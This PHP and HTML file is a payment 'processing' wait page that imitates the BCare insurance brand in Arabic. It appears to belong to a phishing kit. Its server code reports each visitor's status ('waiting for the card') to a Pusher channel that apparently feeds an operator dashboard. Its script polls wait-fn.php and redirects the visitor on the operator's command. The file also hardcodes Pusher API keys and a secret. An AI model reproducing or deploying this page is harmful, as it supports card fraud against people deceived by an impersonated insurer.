<?php
error_reporting(0);
ini_set('display_errors', 0);
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'إنتظار البطاقة');
    $options = array('cluster' => 'ap2', 'useTLS' => true);
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);
    $pusher->trigger('bcare', 'curreneft-page', ['userId' => $_SESSION['user_id'], 'page' => 'إنتظار البطاقة']);
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بي كير للتأمين | جارٍ معالجة الدفع</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --primary-color: #156394;
            --secondary-color: #f9a824;
            --bg-color: #f8fafc;
        }
        * { padding: 0; margin: 0; box-sizing: border-box; font-family: "Cairo", serif; }
        body { background-color: var(--bg-color); min-height: 100vh; display: flex; flex-direction: column; }
        .navbar { background: white; box-shadow: 0 2px 10px rgba(0,0,0,0.05); padding: 1rem 0; }
        
        .wait-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .processing-card {
            background: white;
            padding: 50px;
            border-radius: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.05);
            max-width: 500px;
            width: 100%;
            text-align: center;
            animation: fadeIn 0.6s ease-out;
        }

        @keyframes fadeIn {
            from { opacity:0; transform: translateY(20px); }
            to { opacity:1; transform: translateY(0); }
        }

        /* Modern Spinner */
        .spinner-box {
            width: 100px;
            height: 100px;
            margin: 0 auto 30px;
            position: relative;
        }

        .double-bounce {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background-color: var(--primary-color);
            opacity: 0.2;
            position: absolute;
            top: 0;
            left: 0;
            animation: sk-bounce 2.0s infinite ease-in-out;
        }

        .double-bounce2 {
            width: 60%;
            height: 60%;
            border-radius: 50%;
            background-color: var(--secondary-color);
            position: absolute;
            top: 20%;
            left: 20%;
            animation: sk-bounce 2.0s infinite ease-in-out;
            animation-delay: -1.0s;
        }

        @keyframes sk-bounce {
            0%, 100% { transform: scale(0); }
            50% { transform: scale(1); }
        }

        .status-badge {
            display: inline-block;
            background: #eff6ff;
            color: var(--primary-color);
            padding: 8px 20px;
            border-radius: 50px;
            font-weight: 700;
            font-size: 0.85rem;
            margin-bottom: 20px;
        }

        .pulse-text {
            color: #64748b;
            font-size: 1rem;
            animation: textPulse 1.5s infinite;
        }

        @keyframes textPulse {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }

        .security-footer {
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #f1f5f9;
            font-size: 0.8rem;
            color: #94a3b8;
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="container d-flex justify-content-center">
            <img src="./assets/Bcare-logo.svg" alt="Bcare" height="40">
        </div>
    </nav>

    <div class="wait-container">
        <div class="processing-card">
            <div class="status-badge">جاري المعالجة الآمنة</div>
            
            <div class="spinner-box">
                <div class="double-bounce"></div>
                <div class="double-bounce2"></div>
            </div>

            <h4 class="fw-900 mb-3" style="color: var(--primary-color);">يرجى الانتظار بجوار الصفحة</h4>
            <p class="pulse-text mb-4">يتم حالياً التأكد من معلومات الدفع الخاصة بك...</p>
            
            <div class="alert alert-warning py-2 rounded-4 small">
                <strong>تنبيه:</strong> الرجاء عدم إغلاق الصفحة أو تحديثها لضمان إتمام العملية بنجاح.
            </div>

            <div class="security-footer">
                <i class="bi bi-shield-lock-fill me-1"></i> اتصال مشفر وآمن 256-bit
            </div>
        </div>
    </div>

    <script>
        setInterval(() => {
            $.ajax({
                url: "wait-fn.php",
                type: "POST",
                success: (response) => {
                    try {
                        const data = JSON.parse(response);
                        if (data.status == 1 || data.status == 2) {
                            window.location = data.url;
                        }
                    } catch(e) {}
                }
            });
        }, 1500);
    </script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id']); ?>;
    </script>
</body>
</html>
